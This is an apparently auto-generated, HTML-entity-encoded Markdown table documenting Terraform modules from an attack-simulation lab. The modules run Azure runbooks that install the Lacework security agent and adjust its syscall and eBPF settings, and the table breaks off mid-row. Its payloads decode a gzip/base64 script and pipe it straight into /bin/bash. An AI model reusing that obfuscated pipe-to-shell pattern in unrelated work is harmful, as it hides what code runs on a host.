| ModuleName                                               | Source                                               | Tag                                              | ConfigPath                                                        | ConfigOptionsDefault                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          | PayloadPath                                                                                                      | Payload                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          |
|:---------------------------------------------------------|:-----------------------------------------------------|:-------------------------------------------------|:------------------------------------------------------------------|:--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|:-----------------------------------------------------------------------------------------------------------------|:-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| attacker-runbook-deploy-lacework                         | ./modules/runbook/deploy-lacework-agent              | runbook_deploy_lacework                          | context.azure.runbook.deploy_lacework_agent                       | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;deploy_lacework_agent&quot;: {<br/>                    &quot;enabled&quot;: false<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-lacework-agent              | <pre>locals &amp;&amp;#35;123;<br/>    tool = &quot;lacework&quot;<br/>    payload = &lt;&lt;&amp;#45;EOT<br/>    log &quot;Starting&amp;#46;&amp;#46;&amp;#46;&quot;<br/>    if &amp;&amp;#35;91; &amp;#45;f /var/lib/lacework/config/config&amp;#46;json &amp;&amp;#35;93; &amp;&amp; pgrep datacollector &gt; /dev/null; then<br/>        log &quot;lacework already installed &amp;#45; nothing to do&quot;<br/>    else<br/>        log &quot;lacework not installed &amp;#45; installing&amp;#46;&amp;#46;&amp;#46;&quot;<br/>        echo &#x27;$&amp;&amp;#35;123;base64gzip&amp;&amp;#35;40;local&amp;#46;setup&amp;&amp;#35;95;lacework&amp;&amp;#35;95;agent&amp;&amp;#35;41;&amp;&amp;#35;125;&#x27; &amp;#124; base64 &amp;#45;d &amp;#124; gunzip &amp;#124; /bin/bash &amp;#45;<br/>    fi<br/>    log &quot;done&amp;#46;&quot;<br/>    EOT<br/>    base64&amp;&amp;#35;95;payload = templatefile&amp;&amp;#35;40;&quot;$&amp;&amp;#35;123;path&amp;#46;module&amp;&amp;#35;125;/&amp;#46;&amp;#46;/&amp;#46;&amp;#46;/delayed&amp;&amp;#35;95;start&amp;#46;sh&quot;, &amp;&amp;#35;123; config = &amp;&amp;#35;123;<br/>        script&amp;&amp;#35;95;name = var&amp;#46;inputs&amp;&amp;#35;91;&quot;tag&quot;&amp;&amp;#35;93;<br/>        log&amp;&amp;#35;95;rotation&amp;&amp;#35;95;count = 2<br/>        apt&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks = &lt;&lt;&amp;#45;EOT<br/>        if &amp;&amp;#35;91; &amp;#45;f /var/lib/lacework/config/config&amp;#46;json &amp;&amp;#35;93; &amp;&amp; pgrep datacollector &gt; /dev/null; then<br/>            log &quot;$&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125; found &amp;#45; no installation required&quot;; <br/>            exit 0; <br/>        fi<br/>        EOT<br/>        apt&amp;&amp;#35;95;packages = &quot;&quot;<br/>        apt&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        yum&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks =  &lt;&lt;&amp;#45;EOT<br/>        if &amp;&amp;#35;91; &amp;#45;f /var/lib/lacework/config/config&amp;#46;json &amp;&amp;#35;93; &amp;&amp; pgrep datacollector &gt; /dev/null; then<br/>            log &quot;$&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125; found &amp;#45; no installation required&quot;; <br/>            exit 0; <br/>        fi<br/>        EOT<br/>        yum&amp;&amp;#35;95;packages = &quot;&quot;<br/>        yum&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        script&amp;&amp;#35;95;delay&amp;&amp;#35;95;secs = 30<br/>        next&amp;&amp;#35;95;stage&amp;&amp;#35;95;payload = local&amp;#46;payload<br/>    &amp;&amp;#35;125;&amp;&amp;#35;125;&amp;&amp;#35;41;<br/><br/>    setup&amp;&amp;#35;95;lacework&amp;&amp;#35;95;agent = templatefile&amp;&amp;#35;40;&quot;$&amp;&amp;#35;123;path&amp;#46;module&amp;&amp;#35;125;/resources/setup&amp;&amp;#35;95;lacework&amp;&amp;#35;95;agent&amp;#46;sh&quot;, &amp;&amp;#35;123;<br/>        LaceworkInstallPath=&quot;/var/lib/lacework&quot;<br/>        LaceworkTempPath=var&amp;#46;inputs&amp;&amp;#35;91;&quot;lacework&amp;&amp;#35;95;agent&amp;&amp;#35;95;temp&amp;&amp;#35;95;path&quot;&amp;&amp;#35;93;<br/>        Tags=jsonencode&amp;&amp;#35;40;var&amp;#46;inputs&amp;&amp;#35;91;&quot;lacework&amp;&amp;#35;95;agent&amp;&amp;#35;95;tags&quot;&amp;&amp;#35;93;&amp;&amp;#35;41;<br/>        Hash=&quot;&quot;<br/>        Serverurl=var&amp;#46;inputs&amp;&amp;#35;91;&quot;lacework&amp;&amp;#35;95;server&amp;&amp;#35;95;url&quot;&amp;&amp;#35;93;<br/>        Token=try&amp;&amp;#35;40;length&amp;&amp;#35;40;var&amp;#46;inputs&amp;&amp;#35;91;&quot;lacework&amp;&amp;#35;95;agent&amp;&amp;#35;95;access&amp;&amp;#35;95;token&quot;&amp;&amp;#35;93;&amp;&amp;#35;41;, &quot;false&quot;&amp;&amp;#35;41; &amp;#33;= &quot;false&quot; ? var&amp;#46;inputs&amp;&amp;#35;91;&quot;lacework&amp;&amp;#35;95;agent&amp;&amp;#35;95;access&amp;&amp;#35;95;token&quot;&amp;&amp;#35;93; : lacework&amp;&amp;#35;95;agent&amp;&amp;#35;95;access&amp;&amp;#35;95;token&amp;#46;agent&amp;&amp;#35;91;0&amp;&amp;#35;93;&amp;#46;token<br/>    &amp;&amp;#35;125;&amp;&amp;#35;41;<br/><br/>    outputs = &amp;&amp;#35;123;<br/>        base64&amp;&amp;#35;95;payload = base64gzip&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload = base64encode&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload&amp;&amp;#35;95;additional = &amp;&amp;#35;91;<br/>            &amp;&amp;#35;123;<br/>                name = &quot;$&amp;&amp;#35;123;basename&amp;&amp;#35;40;abspath&amp;&amp;#35;40;path&amp;#46;module&amp;&amp;#35;41;&amp;&amp;#35;41;&amp;&amp;#35;125;&amp;&amp;#35;95;setup&amp;&amp;#35;95;lacework&amp;&amp;#35;95;agent&amp;#46;sh&quot;<br/>                content = base64encode&amp;&amp;#35;40;local&amp;#46;setup&amp;&amp;#35;95;lacework&amp;&amp;#35;95;agent&amp;&amp;#35;41;<br/>            &amp;&amp;#35;125;<br/>        &amp;&amp;#35;93;<br/>    &amp;&amp;#35;125;<br/>&amp;&amp;#35;125;<br/><br/>&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;<br/>&amp;#35; LACEWORK AGENT<br/>&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;&amp;#35;<br/><br/>resource &quot;random&amp;&amp;#35;95;string&quot; &quot;this&quot; &amp;&amp;#35;123;<br/>    length            = 4<br/>    special           = false<br/>    upper             = false<br/>    lower             = true<br/>    numeric           = true<br/>&amp;&amp;#35;125;<br/><br/>resource &quot;lacework&amp;&amp;#35;95;agent&amp;&amp;#35;95;access&amp;&amp;#35;95;token&quot; &quot;agent&quot; &amp;&amp;#35;123;<br/>    count = try&amp;&amp;#35;40;length&amp;&amp;#35;40;var&amp;#46;inputs&amp;&amp;#35;91;&quot;lacework&amp;&amp;#35;95;agent&amp;&amp;#35;95;access&amp;&amp;#35;95;token&quot;&amp;&amp;#35;93;&amp;&amp;#35;41;, &quot;false&quot;&amp;&amp;#35;41; &amp;#33;= &quot;false&quot; ? 0 : 1<br/>    name = &quot;endpoint&amp;#45;agent&amp;#45;access&amp;#45;token&amp;#45;$&amp;&amp;#35;123;random&amp;&amp;#35;95;string&amp;#46;this&amp;#46;id&amp;&amp;#35;125;&amp;#45;$&amp;&amp;#35;123;var&amp;#46;inputs&amp;&amp;#35;91;&quot;environment&quot;&amp;&amp;#35;93;&amp;&amp;#35;125;&amp;#45;$&amp;&amp;#35;123;var&amp;#46;inputs&amp;&amp;#35;91;&quot;deployment&quot;&amp;&amp;#35;93;&amp;&amp;#35;125;&quot;<br/>&amp;&amp;#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |
| attacker-runbook-deploy-lacework-syscall-config          | ./modules/runbook/deploy-lacework-syscall-config     | runbook_deploy_lacework_syscall                  | context.azure.runbook.deploy_lacework_syscall_config              | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;deploy_lacework_syscall_config&quot;: {<br/>                    &quot;enabled&quot;: false<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-lacework-syscall-config     | <pre>locals &amp;&amp;#35;123;<br/>    tool = &quot;lacework&amp;#45;sycall&amp;#45;config&quot;<br/>    lacework&amp;&amp;#35;95;install&amp;&amp;#35;95;path = &quot;/var/lib/lacework&quot;<br/>    lacework&amp;&amp;#35;95;syscall&amp;&amp;#35;95;config&amp;&amp;#35;95;path = &quot;$&amp;&amp;#35;123;local&amp;#46;lacework&amp;&amp;#35;95;install&amp;&amp;#35;95;path&amp;&amp;#35;125;/config/syscall&amp;&amp;#35;95;config&amp;#46;yaml&quot;<br/>    syscall&amp;&amp;#35;95;config = file&amp;&amp;#35;40;var&amp;#46;inputs&amp;&amp;#35;91;&quot;syscall&amp;&amp;#35;95;config&quot;&amp;&amp;#35;93;&amp;&amp;#35;41;<br/>    base64&amp;&amp;#35;95;syscall&amp;&amp;#35;95;config = local&amp;#46;syscall&amp;&amp;#35;95;config<br/>    hash&amp;&amp;#35;95;syscall&amp;&amp;#35;95;config = sha256&amp;&amp;#35;40;local&amp;#46;syscall&amp;&amp;#35;95;config&amp;&amp;#35;41;<br/>    payload = &lt;&lt;&amp;#45;EOT<br/>    LACEWORK&amp;&amp;#35;95;INSTALL&amp;&amp;#35;95;PATH=&quot;$&amp;&amp;#35;123;local&amp;#46;lacework&amp;&amp;#35;95;install&amp;&amp;#35;95;path&amp;&amp;#35;125;&quot;<br/>    LACEWORK&amp;&amp;#35;95;SYSCALL&amp;&amp;#35;95;CONFIG&amp;&amp;#35;95;PATH=$&amp;&amp;#35;123;local&amp;#46;lacework&amp;&amp;#35;95;syscall&amp;&amp;#35;95;config&amp;&amp;#35;95;path&amp;&amp;#35;125;<br/>    <br/>    &amp;#35; Check if Lacework is pre&amp;#45;installed&amp;#46; If installed, add syscall&amp;&amp;#35;95;config&amp;#46;yaml&amp;#46;<br/>    if &amp;&amp;#35;91; &amp;#45;f &quot;$LACEWORK&amp;&amp;#35;95;INSTALL&amp;&amp;#35;95;PATH/datacollector&quot; &amp;&amp;#35;93;; then<br/>        log &quot;Lacework agent is installed, adding syscall&amp;&amp;#35;95;config&amp;#46;yaml&amp;#46;&amp;#46;&amp;#46;&quot;<br/>        if echo &quot;$&amp;&amp;#35;123;local&amp;#46;hash&amp;&amp;#35;95;syscall&amp;&amp;#35;95;config&amp;&amp;#35;125;  $LACEWORK&amp;&amp;#35;95;SYSCALL&amp;&amp;#35;95;CONFIG&amp;&amp;#35;95;PATH&quot; &amp;#124; sha256sum &amp;#45;&amp;#45;check &amp;#45;&amp;#45;status; then <br/>            log &quot;Lacework syscall&amp;&amp;#35;95;config&amp;#46;yaml unchanged&quot;; <br/>        else <br/>            log &quot;Lacework syscall&amp;&amp;#35;95;config&amp;#46;yaml requires update&quot;<br/>            echo &amp;#45;n &quot;$&amp;&amp;#35;123;base64gzip&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;syscall&amp;&amp;#35;95;config&amp;&amp;#35;41;&amp;&amp;#35;125;&quot; &amp;#124; base64 &amp;#45;d &amp;#124; gunzip &gt; $LACEWORK&amp;&amp;#35;95;SYSCALL&amp;&amp;#35;95;CONFIG&amp;&amp;#35;95;PATH<br/>        fi<br/>        log &quot;Lacework agent is installed, adding disable aggregation config&amp;#46;&amp;#46;&amp;#46;&quot;<br/>        file&amp;&amp;#35;95;path=&quot;/var/lib/lacework/config/config&amp;#46;json&quot;<br/><br/>        log &quot;Checking for ebpf aggregate&amp;&amp;#35;95;events disabled&amp;#46;&amp;#46;&amp;#46;&quot;<br/>        grep &amp;#45;q &#x27;&quot;ebpf&quot;&amp;&amp;#35;91;&amp;&amp;#35;91;:space:&amp;&amp;#35;93;&amp;&amp;#35;93;&amp;&amp;#35;42;:&amp;&amp;#35;91;&amp;&amp;#35;91;:space:&amp;&amp;#35;93;&amp;&amp;#35;93;&amp;&amp;#35;42;&amp;&amp;#35;123;&amp;&amp;#35;91;&amp;&amp;#35;91;:space:&amp;&amp;#35;93;&amp;&amp;#35;93;&amp;&amp;#35;42;&quot;aggregate&amp;&amp;#35;95;events&quot;&amp;&amp;#35;91;&amp;&amp;#35;91;:space:&amp;&amp;#35;93;&amp;&amp;#35;93;&amp;&amp;#35;42;:&amp;&amp;#35;91;&amp;&amp;#35;91;:space:&amp;&amp;#35;93;&amp;&amp;#35;93;&amp;&amp;#35;42;&quot;false&quot;&amp;&amp;#35;91;&amp;&amp;#35;91;:space:&amp;&amp;#35;93;&amp;&amp;#35;93;&amp;&amp;#35;42;&amp;&amp;#35;125;&#x27; $file&amp;&amp;#35;95;path<br/>        if &amp;&amp;#35;91; $? &amp;#45;ne 0 &amp;&amp;#35;93;; then<br/>            log &quot;ebpf aggregate&amp;&amp;#35;95;events not currently disabled&amp;#46;&amp;#46;&amp;#46;&quot;<br/>            grep &amp;#45;q &#x27;&quot;ebpf&quot;&amp;&amp;#35;91;&amp;&amp;#35;91;:space:&amp;&amp;#35;93;&amp;&amp;#35;93;&amp;&amp;#35;42;:&amp;&amp;#35;91;&amp;&amp;#35;91;:space:&amp;&amp;#35;93;&amp;&amp;#35;93;&amp;&amp;#35;42;&amp;&amp;#35;123;&amp;&amp;#35;91;^&amp;&amp;#35;125;&amp;&amp;#35;93;&amp;&amp;#35;42;&amp;&amp;#35;125;&#x27; $file&amp;&amp;#35;95;path<br/>            if &amp;&amp;#35;91; $? &amp;#45;eq 0 &amp;&amp;#35;93;; then<br/>                log &quot;Found existing ebpf config &amp;#45; updating&amp;#46;&amp;#46;&amp;#46;&quot;<br/>                sed &amp;#45;i &#x27;s/&quot;ebpf&quot;&amp;&amp;#35;91;&amp;&amp;#35;91;:space:&amp;&amp;#35;93;&amp;&amp;#35;93;&amp;&amp;#35;42;:&amp;&amp;#35;91;&amp;&amp;#35;91;:space:&amp;&amp;#35;93;&amp;&amp;#35;93;&amp;&amp;#35;42;&amp;&amp;#35;123;&amp;&amp;#35;91;^&amp;&amp;#35;125;&amp;&amp;#35;93;&amp;&amp;#35;42;&amp;&amp;#35;125;/&quot;ebpf&quot;: &amp;&amp;#35;123;&quot;aggregate&amp;&amp;#35;95;events&quot;: &quot;false&quot;&amp;&amp;#35;125;/&#x27; $file&amp;&amp;#35;95;path<br/>            else<br/>                log &quot;No existing ebpf config &amp;#45; appending&amp;#46;&amp;#46;&amp;#46;&quot;<br/>                sed &amp;#45;i &#x27;1s/&amp;&amp;#35;123;/&amp;&amp;#35;123;&amp;&amp;#35;92;n  &quot;ebpf&quot;: &amp;&amp;#35;123;&quot;aggregate&amp;&amp;#35;95;events&quot;: &quot;false&quot;&amp;&amp;#35;125;,/&#x27; $file&amp;&amp;#35;95;path<br/>            fi<br/>        else<br/>            log &quot;ebpf aggregate&amp;&amp;#35;95;events already enabled&amp;#46;&quot;<br/>        fi<br/>    fi<br/>    EOT<br/>    base64&amp;&amp;#35;95;payload = templatefile&amp;&amp;#35;40;&quot;$&amp;&amp;#35;123;path&amp;#46;module&amp;&amp;#35;125;/&amp;#46;&amp;#46;/&amp;#46;&amp;#46;/delayed&amp;&amp;#35;95;start&amp;#46;sh&quot;, &amp;&amp;#35;123; config = &amp;&amp;#35;123;<br/>        script&amp;&amp;#35;95;name = var&amp;#46;inputs&amp;&amp;#35;91;&quot;tag&quot;&amp;&amp;#35;93;<br/>        log&amp;&amp;#35;95;rotation&amp;&amp;#35;95;count = 2<br/>        apt&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks = &lt;&lt;&amp;#45;EOT<br/>        while &amp;#33; &amp;&amp;#35;91; &amp;#45;f /var/lib/lacework/config/config&amp;#46;json &amp;&amp;#35;93;; do<br/>            log &quot;lacework installation not found &amp;#45; waiting&quot;; <br/>            sleep 120;<br/>        done<br/>        EOT<br/>        